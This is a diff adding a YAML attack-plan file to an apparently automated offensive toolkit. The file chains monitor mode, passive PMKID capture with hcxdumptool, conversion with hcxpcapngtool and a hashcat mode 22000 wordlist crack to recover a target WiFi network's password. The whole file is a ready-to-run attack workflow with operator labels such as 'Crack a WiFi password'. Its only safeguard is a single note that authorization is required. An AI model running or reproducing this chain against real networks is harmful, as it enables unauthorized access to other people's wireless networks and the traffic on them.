@@ -1,0 +1,70 @@
+# Mech-Unit attack intent — passive PMKID capture + hashcat 22000 crack.
+# No clients and no deauth needed; packages the hcxdumptool → hcxpcapngtool
+# → hashcat chain from workflows/templates/evil_twin_chain.yaml.
+id: wifi_pmkid
+name: PMKID Passive Capture + Crack
+category: wireless
+operator_label: "Crack a WiFi password (PMKID, no clients needed)"
+operator_description: >
+  Passively harvests the PMKID from the target AP's first EAPOL frame and
+  cracks it offline with hashcat mode 22000. Quiet — no deauth, no clients
+  required — but only works on APs that expose PMKID.
+outcome: "PSK recovered via PMKID, or capture/hashing exhausted"
+grants: [wifi.psk]
+time_to_impact: minutes-to-tens-of-minutes (capture) + crack time
+noise: silent
+risk_notes: >
+  Passive capture only. Still requires authorization for the target network.
+
+preconditions:
+  - probe: wireless_adapter_monitor_capable
+  - probe: tools_present
+    with: [hcxdumptool, hcxpcapngtool, hashcat]
+
+plan:
+  - step: monitor_up
+    tool: monitor_mode_enable
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+
+  - step: capture
+    tool: hcxdumptool_capture
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      channel: "{{ resolver.channel.or_hop }}"
+      output_file: "{{ plan_dir }}/pmkid.pcapng"
+    max_wait: 60
+    extracts:
+      pmkid_seen: "(PMKID|EAPOL)"
+    gate:
+      output: "PMKID|EAPOL"
+    on_fail: warn
+
+  - step: convert
+    tool: hcxpcapngtool_convert
+    args:
+      input: "{{ plan_dir }}/pmkid.pcapng"
+      output_file: "{{ plan_dir }}/pmkid.hc22000"
+    max_wait: 300
+    gate:
+      file: ["{{ plan_dir }}/pmkid.pcapng"]
+    on_fail: warn
+
+  - step: crack
+    tool: hashcat_crack
+    args:
+      hash_file: "{{ plan_dir }}/pmkid.hc22000"
+      mode: 22000
+      attack_mode: 0
+      wordlist: "{{ resolver.wordlist.adaptive }}"
+    max_wait: 3600
+    gate:
+      output: "Cracked|Recovered"
+    on_fail: warn
+
+artifacts:
+  pmkid_pcap: "{{ plan_dir }}/pmkid.pcapng"
+  pmkid_hash: "{{ plan_dir }}/pmkid.hc22000"
+
+llm_required: false
